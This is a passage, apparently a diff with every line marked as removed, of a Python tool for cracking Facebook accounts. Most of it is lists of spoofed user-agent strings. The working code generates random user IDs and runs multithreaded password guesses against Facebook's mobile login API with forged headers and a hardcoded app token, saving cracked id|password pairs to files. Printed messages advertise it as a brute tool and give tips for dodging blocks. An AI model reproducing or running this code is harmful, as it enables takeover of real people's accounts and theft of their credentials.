-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
-
-  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
-
-  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
-
-  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
-
-  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
-
-  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
-
-  "DoCoMo/2.0 P903i",
-
-  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
-
-  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
-
-  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
-
-  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
-
-  "Mogujie4Android/NAMhuawei/1290",
-
-  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-
-  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
-
-  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
-
-  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
-
-  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-
-  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
-
-  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
-
-  "nokia-7.1-safari",
-
-  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
-
-  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
-
-  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
-
-  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
-
-  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-
-  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
-
-  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
-
-  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
-
-  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
-
-  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
-
-  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
-
-  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
-
-  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
-
-  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
-
-  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
-
-  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
-
-  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
-
-  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
-
-  "Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
-
-  "Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
-
-  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
-
-  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
-
-  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
-
-  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
-
-  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
-
-  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
-
-  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
-
-  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
-
-  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
-
-  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
-
-  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
-
-  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
-
-  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
-
-  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 5.1)",
-
-  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
-
-  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
-
-  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
-
-  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
-
-  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
-
-  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
-
-  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
-
-  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
-
-  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
-
-  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
-
-  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
-
-  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
-
-			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
-
-		])
-
-		sys.stdout.write(
-
-			"\r [Start]%s> /count>%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.ok))
-
-		); sys.stdout.flush()
-
-		for pw in pwx:
-
-			pw = pw.lower()
-
-			ses = requests.Session()
-
-			headers = {
-
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-
-				"x-fb-connection-quality": "EXCELLENT",
-
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-
-				"user-agent": rua, 
-
-				"content-type": "application/x-www-form-urlencoded", 
-
-				"x-fb-http-engine": "Liger"
-
-			}
-
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
-
-			if "session_key" in response.text and "EAAA" in response.text:
-
-				print("\r \033[0;92m[彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -Ok] %s | %s\033[0;97m         "%(uid, pw))
-
-				print ("\r \033[0;92m Congrats ")
-
-				self.ok.append("%s|%s"%(uid, pw))
-
-				open("2009彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 _OK.txt","a").write(" %s|%s\n"%(uid, pw))
-
-				break
-
-			elif "www.facebook.com" in response.json()["error_msg"]:
-
-				print("\r \033[0;92m[彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -OK] %s | %s\033[0;97m         "%(uid, pw))
-
-				self.cp.append("%s|%s"%(uid, pw))
-
-				open("2009彡★𝗟𝗘𝗚𝗛𝗔𝗥𝗜 𝗧𝗥𝗜𝗖𝗞𝗘𝗥★彡 -OK.txt","a").write(" %s | %s\n"%(uid, pw))
-
-				break
-
-			else:
-
-				continue
-
- 
-
-		self.loop +=1
-
- 
-
-	def old2(self):
-
-		x = 1111111111
-
-		xx = 9999999999
-
-		idx = "10000" 
-
-		os.system('clear');print(logo)
-
-		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 90,000: "))
-
-		try:
-
-			for n in range(limit):
-
-				_ = random.randint(x,xx)
-
-				__ = idx
-
-				self.id.append(__+str(_))
-
-			
-
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
-
-			with ThreadPoolExecutor(max_workers=30) as coeg:
-
-				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
-
-				listpass = input("%s [?] TYPE THE PASSWORD :%s "%(G,Y))
-
-				if len(listpass)<=5:
-
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;96m%s\033[0;93m]"%(G,listpass))
-
-				os.system("clear")
-
-				print(logo)
-
-				print("     \x1b[97m[\033[37;41m   𝗧𝗛𝗘 𝗔𝗗𝗘𝗘𝗟 𝗧𝗢𝗢𝗟\033[0;m")
-
-				print("\n\033[1;39m [+] BRUTE HAS BEEN START")
-
-				print(" \033[1;32m[+] Note: Cp Account Open After 24 Hours")
-
-				print("\033[1;34m [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
-
-				print("\033[1;31m█\033[1;37m⚀\033[1;32m█\033[1;33m█\033[1;34m█\033[1;35m█\033[1;36m█\033[1;37m⚅⚀\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚄⚃\033[1;34m█\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚀⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;34m█\033[1;37m⚀⚀\033[1;35m█\033[1;36m█\033[1;31m█\033[1;37m⚅\033[1;31m█\033[1;32m█\033[1;33m█\033[1;37m⚃⚃\033[1;31m█\033[1;32m█\033[1;34m█\033[1;37m⚄⚄\033[1;31m█")
-
-				print("\n")
-
-				print("\033[0;97m")
-
-				for user in self.id:
-
-					coeg.submit(self.api, user, listpass.split(","))
-
-			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
-
-		except Exception as e:exit(str(e))
-
- 
-
-	def api(self, uid, pwx):
-
-		rua = random.choice([
-
-			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
-
-			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
-
-  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
-
-  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
-
-  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
-
-  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
-
-  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
-
-  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
-
